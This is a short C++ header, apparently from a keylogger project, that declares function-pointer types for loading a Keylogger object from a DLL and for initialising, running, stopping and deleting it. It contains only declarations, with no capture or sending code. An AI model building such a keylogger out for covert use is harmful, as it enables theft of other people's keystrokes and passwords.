//KeyloggerDLL.h
#pragma once

#include <iostream>
#include <vector>
#include "DLDictionary.h"
#include "Keylogger.h"

typedef bool (* _initKeylogger)(Keylogger*);
typedef Keylogger* (* _instantiate)(void);
typedef bool (* _runKeylogger)(Keylogger*);
typedef bool (* _stopKeylogger)(Keylogger*);
typedef void (* _deleteKeylogger)(Keylogger*);